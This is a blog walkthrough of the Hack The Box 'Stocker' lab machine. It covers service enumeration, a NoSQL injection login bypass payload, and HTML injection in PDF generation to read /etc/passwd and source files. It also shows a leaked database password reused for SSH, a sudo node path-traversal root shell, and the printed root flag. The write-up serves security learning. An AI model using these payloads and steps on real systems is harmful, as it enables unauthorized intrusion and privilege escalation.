---
title: "HTB - Stocker walkthrough"
date: 2023-06-11
author: Luigi Vezzoso
layout: post
tags: 
    - walkthrough
    - hackthebox
    - pentest
category: posts
draft: true
---

Hi There!

here we go with a new walktrougth of Hack The Box - Stocker Machine!

![stocker-img](assets/postimages/stocker/Stocker.png)


## initial footprint
As usual, we started in a black-box mode, and we need to figure out what type of the server we have in front of us. Let's start our loved tool nmap.

{% highlight shell %}

# Nmap 7.80 scan initiated Sat Jan 21 09:48:02 2023 as: nmap -p- -sV -A -oN stocker.nmap stocker.htb
Warning: 10.10.11.196 giving up on port because retransmission cap hit (10).
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.060s latency).
Not shown: 65507 closed ports, 26 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Jan 21 12:37:12 2023 -- 1 IP address (1 host up) scanned in 10150.50 seconds

{% endhighlight %}

We starting collecting information about services, operating system, etc. As we add more knowledge about or target, we will add in our note.

## service enumeration

Looking at the exposed services of the machine, two services capture our attention: port 80 and 9091: SSH port is a well-know and deep tested services so it's very uncommon to discover vurlnerability in such kind of service.

### 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
We leave port 22 as last chance as usually it not provide much attack surface:
- encrypted traffic
- auth required
- very common and test service 

### 80/tcp open http nginx 1.18.0 (Ubuntu) 
We can see from nmap service enumeration that a webservice is present at port TCP80 with the "Coming Soon" title. Let's open our browser to see what is running on that port.

![stocker-web](assets/postimages/stocker/stocker-website.png)

as we can read... the website is under development. Analizyng webpage source, no dynamic content is provided by webserver. Let's continue the enumeration to see if we can find some hidden dev website/uri/pages.
- pages/directory enumeration
- vhosts enumeration

#### dir/pages enumeration
First step facing to a webserver is looking for webapplication mapping. Looking to the source code of the index page we cannot see any specific dynamic content, forms, etc. Let try to find other resources, backup files, dev files, etc. 

We are gonna use *gobuster* with some well-know wordlists.

{% highlight shell %}
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://stocker.htb/
[+] Threads      : 10
[+] Wordlist     : /home/xabaras/hacking-tool/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
=====================================================
/img (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
=====================================================
=====================================================

{% endhighlight %}

Unfortunatly dir/pages discovery didn't provide more information on the system: just few static resources. Let's continue in different way.

#### vhost enumeration
We didn't find anything on *stocker.htb* website and we can suppose that dev website should be in different host/vhost where the *nginx* is gonna redirect our requests. Let's use gobuster to enumerate *vhosts*

{% highlight shell %}

xabaras@helix:~/go/bin$ ./gobuster vhost -u stocker.htb -w ~/hacking-tool/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /home/xabaras/hacking-tool/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/21 10:10:02 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4972 / 4998 (99.48%)
===============================================================
2023/01/21 10:10:35 Finished
===============================================================

{% endhighlight %}

**vhost** enumeration give us a gift: new uri to be scanned **dev.stocker.htb** - let's add it to our HOSTS files and continue the enumeration. 

## web application analisys
We found additional vhost where a web appication is still listen. Using a browser we can see if any known website/application is listening.

![dev-stocker-web](assets/postimages/stocker/dev-stocker.png)

Looking at the **cookies** and using browser tools like [wappalyzer](https://www.wappalyzer.com/) we can try to identify the stack used by the application. We could be sure that is used **nodejs**.

![wappalyzer](assets/postimages/stocker/wappalyser.png)

Looking at the disclosed component we can "assume" or better we can try to make some hypothesis on the used application stack in terms of front-end, back-end and database. All the components belongs to what is common defined as MEAN architecture (Mongo, Express.js, Angular and Node.js).

![mean-stack](assets/postimages/stocker/mean-stack.png)

So, let's try some injection on the login form. Our goal is interact with the internal db to exfiltrate some data or in the best case to login to the webapp! We can start with a simple tool nosl-login-bypass.


{% highlight shell %}

python /home/xabaras/hacking-tool/NoSQL-Attack-Suite/nosql-login-bypass.py -t http://dev.stocker.htb/login -u username -p password
[*] Checking for auth bypass GET request...
[-] Login is probably NOT vulnerable to GET request auth bypass...

[*] Checking for auth bypass POST request...
[-] Login is probably NOT vulnerable to POST request auth bypass...

[*] Checking for auth bypass POST JSON request...
[+] Login is probably VULNERABLE to POST JSON request auth bypass!
[!] PAYLOAD: {"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}

{% endhighlight %}

The tool identify a possibility to bypass the authentication form using NoSQL Injection on username & password form field using a JSON payload. We can use multple way to exploit this vulnerability, but due the simplicity of the test we have to do, let's use the developers tools on our browser.

Basically we have to inject json payload on the *login* function editing the request. Pay attention to set the correct *"content type"* and payload.

![login-bypass](assets/postimages/stocker/login-inject.png)

After the injection we are redirected to the main-page of the application!!!!

![stock-page](assets/postimages/stocker/product-catalog.png)

### web application survey
After successully login we have ti start again enumerating additional things to undestand application functionality, input/output, control points, etc.

Application appear to be an ecommerce portal to insert items in a basket and place some orders. The functionalities of the application are:
- add some items in the chart
- view the cart of items in the basket
- place on order/submitn a purchase
- view the pdf receipt of the order

![cart](assets/postimages/stocker/cart.png)
![submitted](assets/postimages/stocker/submitted.png)
![pdf-receipt](assets/postimages/stocker/pdf-receipt.png)

Probably the pdf generation function could be a possibile attack-vector: we can insert information from the stock to the pdf-file, we can recall the file from browser, etc. 

### PDF Generation Inject

After initial test we found that the field **"title"** is HTML inject-able... let's tray to grab some useful infomation..

![passwd-inject](assets/postimages/stocker/http-inject-pdf.png)

and the result...

![passwd](assets/postimages/stocker/passwd.png)

{% highlight shell %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core
Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
{% endhighlight %}

Now, we are able to perfoem some LFI - we can try to enumerate and find more information about target appl

nginx.conf

{% highlight shell %}
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
worker_connections 768;
# multi_accept on;
}
http {
##
# Basic Settings
##
sendfile on;
tcp_nopush on;
tcp_nodelay on;
keepalive_timeout 65;
types_hash_max_size 2048;
# server_tokens off;
# server_names_hash_bucket_size 64;
# server_name_in_redirect off;
include /etc/nginx/mime.types;
default_type application/octet-stream;
##
# SSL Settings
##
ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
ssl_prefer_server_ciphers on;
##
# Logging Settings
##
access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;
##
# Gzip Settings
##
gzip on;
# gzip_vary on;
# gzip_proxied any;
# gzip_comp_level 6;
# gzip_buffers 16 8k;
# gzip_http_version 1.1;
# gzip_types text/plain text/css application/json application/javascript text/xml
application/xml application/xml+rss text/javascript;
##
# Virtual Host Configs
##
include /etc/nginx/conf.d/*.conf;
server {
listen 80;
root /var/www/dev;
index index.html index.htm index.nginx-debian.html;
server_name dev.stocker.htb;
location / {
proxy_pass http://127.0.0.1:3000;
proxy_http_version 1.1;
proxy_cache_bypass $http_upgrade;
{% endhighlight %}

{% highlight shell %}
# mongod.conf
# for documentation of all options, see:
# http://docs.mongodb.org/manual/reference/configuration-options/
# Where and how to store data.
storage:
dbPath: /var/lib/mongodb
# engine:
# wiredTiger:
# where to write logging data.
systemLog:
destination: file
logAppend: true
path: /var/log/mongodb/mongod.log
# network interfaces
net:
port: 27017
bindIp: 127.0.0.1
# how the process runs
processManagement:
timeZoneInfo: /usr/share/zoneinfo
security.authorization : enabled
#operationProfiling:
#replication:
#sharding:
## Enterprise-Only Options:
#auditLog:
#snmp:
{% endhighlight %}




{% highlight shell %}
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
if (!req.session.user) return res.json([]);
const products = await mongoose.model("Product").find();
return res.json(products);
});
app.get("/login", (req, res) => {
if (req.session.user) return res.redirect("/stock");
return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
const { username, password } = req.body;
if (!username || !password) return res.redirect("/login?error=login-error");
// TODO: Implement hashing
const user = await mongoose.model("User").findOne({ username, password });
if (!user) return res.redirect("/login?error=login-error");
req.session.user = user.id;
console.log(req.session);
return res.redirect("/stock");
});
app.post("/api/order", async (req, res) => {
if (!req.session.user) return res.json({});
if (!req.body.basket) return res.json({ success: false });
const order = new mongoose.model("Order")({
items: req.body.basket.map((item) => ({ title: item.title, price: item.price, amount:
item.amount })),
});
await order.save();
return res.json({ success: true, orderId: order._id });
});
app.get("/api/po/:id", async (req, res) => {
const order = await mongoose.model("Order").findById(req.params.id);
if (!order) return res.sendStatus(404);
const htmlPath = `${__dirname}/pos/${req.params.id}.html`;
const filePath = `${__dirname}/pos/${req.params.id}.pdf`;
if (fs.existsSync(filePath)) {
return res.sendFile(filePath);
}
fs.writeFileSync(htmlPath, formatHTML(order));
await generatePDF(req.params.id);
if (fs.existsSync(filePath)) {
return res.sendFile(filePath);
} else {
return res.sendStatus(500);
}
});
app.get("/stock", (req, res) => {
if (!req.session.user) return res.redirect("/login?error=auth-required");
return res.sendFile(__dirname + "/templates/index.html");
});
app.get("/logout", async (req, res) => {
req.session.user = "";
return res.redirect("/login");
});
app.listen(port, "127.0.0.1", async () => {
await mongoose.connect(dbURI);
// Setup Mongoose schema
require("./schema.js");
console.log(`Example app listening on port ${port}`);
});
{% endhighlight %}

Now we found a password and we got already a username (from **passwd** file)... let's try some password reuse technics.

![user-shell](assets/postimages/stocker/user-shell.png)


{% highlight shell %}
-bash-5.0$ sudo -l
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

{% endhighlight %}

That's means we can launch all the script with the path /usr/local/scripts/* using  /usr/bin/node with root permissions!!

{% highlight shell %}
-bash-5.0$ echo 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' >> /home/angoose/.xabaras/privesc.js
-bash-5.0$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/.xabaras/privesc.js 
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
f181d2b572196374ac881b40616d733d
# 

{% endhighlight %}